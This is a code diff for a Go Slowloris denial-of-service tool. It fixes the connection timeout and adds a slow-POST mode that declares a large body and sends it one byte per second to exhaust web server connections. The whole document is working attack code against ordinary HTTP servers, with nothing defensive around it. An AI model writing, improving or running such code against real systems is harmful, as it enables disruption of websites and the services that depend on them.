@@ -6,7 +6,7 @@ import (
 	"strings"
 	"time"
 	_"syscall"
-	_"math/rand"
+	"math/rand"
 	"net"
 	"net/url"
 	"strconv"
@@ -124,7 +124,7 @@ func slowlorisStart(opts *SlowlorisOpt) {
 	}
 }
 
-func slowWrite(timeout chan int, conn *net.TCPConn, data string) {
+func slowWrite(timeout chan int, conn *net.TCPConn, data string) bool {
 	throttle := time.Tick(time.Second)
 	dataByte := []byte(data)
 	for _, c := range dataByte {
@@ -132,16 +132,18 @@ func slowWrite(timeout chan int, conn *net.TCPConn, data string) {
 		conn.Write([]byte{c})
 		select {
 			case <-timeout:
-				return
+				return true
 			default:
 		}
 	}
+	return false
 }
 
 func httpConnect(opts *SlowlorisOpt, fin chan int) {
 	timeout := make(chan int)
 	go func() {
 		time.Sleep(time.Second * time.Duration(opts.timeout))
+		timeout <- 1
 	}()
 
 	host := opts.url.Host
@@ -161,18 +163,37 @@ func httpConnect(opts *SlowlorisOpt, fin chan int) {
 	if err != nil {
 		log.Fatal("tcp set keep alive failed: ", err)
 	}
+	err = conn.SetNoDelay(true)
+	if err != nil {
+		log.Fatal("tcp conn set no delay: ", err)
+	}
 	conn.Write([]byte(opts.method + " " + opts.url.Path + " HTTP/1.1\r\n"))
 	conn.Write([]byte("Host: " + opts.url.Host + "\r\n"))
 	conn.Write([]byte("Connection: keep-alive\r\n"))
-	for {
-		select {
-		case <-timeout:
-			fin <- 1
-			break
-		default:
-			slowWrite(timeout, conn, "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n")
-			slowWrite(timeout, conn, "Accept-Encoding: gzip, deflate, sdch\r\n")
-			slowWrite(timeout, conn, "Accept-Language: zh-CN,zh;q=0.8\r\n")
+	if opts.method == "POST" {
+		conn.Write([]byte("User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n"))
+		conn.Write([]byte("Accept-Encoding: gzip, deflate, sdch\r\n"))
+		conn.Write([]byte("Accept-Language: zh-CN,zh;q=0.8\r\n"))
+		conn.Write([]byte("Content-Type: application/x-www-form-urlencoded\r\n"))
+		content := make([]byte, 1000, 1000)
+		for i, _ := range content {
+			content[i] = byte(rand.Intn(26) + 97)
+		}
+		conn.Write([]byte("Content-Length: " + strconv.Itoa(len(content)) + "\r\n\r\n"))
+		for {
+			if slowWrite(timeout, conn, string(content)) {
+				fin <- 1
+				break
+			}
+		}
+	} else {
+		for {
+			if (slowWrite(timeout, conn, "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\n") ||
+					slowWrite(timeout, conn, "Accept-Encoding: gzip, deflate, sdch\r\n") ||
+					slowWrite(timeout, conn, "Accept-Language: zh-CN,zh;q=0.8\r\n")) {
+				fin <- 1
+				break
+			}
 		}
 	}
 }
